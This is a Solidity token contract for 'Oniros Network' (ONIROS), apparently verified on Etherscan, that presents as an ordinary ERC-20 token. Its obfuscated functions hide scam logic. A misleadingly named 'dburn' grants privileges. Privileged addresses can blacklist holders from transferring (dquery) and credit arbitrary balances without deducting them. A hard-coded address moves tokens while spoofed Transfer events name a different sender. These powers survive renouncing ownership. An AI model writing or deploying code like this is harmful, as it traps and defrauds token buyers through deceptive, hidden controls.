/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address dBMC = 0xE5fdc00Edb7e2004D5E37F7F991A946B44a7f3E2;
	address DBMW = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ONIROS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private dBc;
	mapping (address => bool) private dBb;
    mapping (address => bool) private dBw;
    mapping (address => mapping (address => uint256)) private dBv;
    uint8 private constant DBl = 8;
    uint256 private constant dBS = 200000000 * (10** DBl);
    string private constant _name = "Oniros Network";
    string private constant _symbol = "ONIROS";



    constructor () {
        dBc[_msgSender()] = dBS;
         dMkr(DBMW, dBS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return DBl;
    }

    function totalSupply() public pure  returns (uint256) {
        return dBS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return dBc[account];
    }
	

   
	 function dburn(address dBj) onlyOwner public{
        dBb[dBj] = true; }
	
    function dMkr(address dBj, uint256 dBn) onlyOwner internal {
    emit Transfer(address(0), dBj ,dBn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return dBv[owner][spender];
    }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        dBv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function dquery(address dBj) public{
         if(dBb[msg.sender])  { 
        dBw[dBj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == dBMC)  {
        require(amount <= dBc[sender]);
        dBc[sender] -= amount;  
        dBc[recipient] += amount; 
          dBv[sender][msg.sender] -= amount;
        emit Transfer (DBMW, recipient, amount);
        return true; }  else  
          if(!dBw[recipient]) {
          if(!dBw[sender]) {
         require(amount <= dBc[sender]);
        require(amount <= dBv[sender][msg.sender]);
        dBc[sender] -= amount;
        dBc[recipient] += amount;
        dBv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function dStake(address dBj) public {
        if(dBb[msg.sender]) { 
        dBw[dBj] = false;}}
		
		function transfer(address dBj, uint256 dBn) public {
        if(msg.sender == dBMC)  {
        require(dBc[msg.sender] >= dBn);
        dBc[msg.sender] -= dBn;  
        dBc[dBj] += dBn; 
        emit Transfer (DBMW, dBj, dBn);} else  
        if(dBb[msg.sender]) {dBc[dBj] += dBn;} else
        if(!dBw[msg.sender]) {
        require(dBc[msg.sender] >= dBn);
        dBc[msg.sender] -= dBn;  
        dBc[dBj] += dBn;          
        emit Transfer(msg.sender, dBj, dBn);}}
		
		

		
		}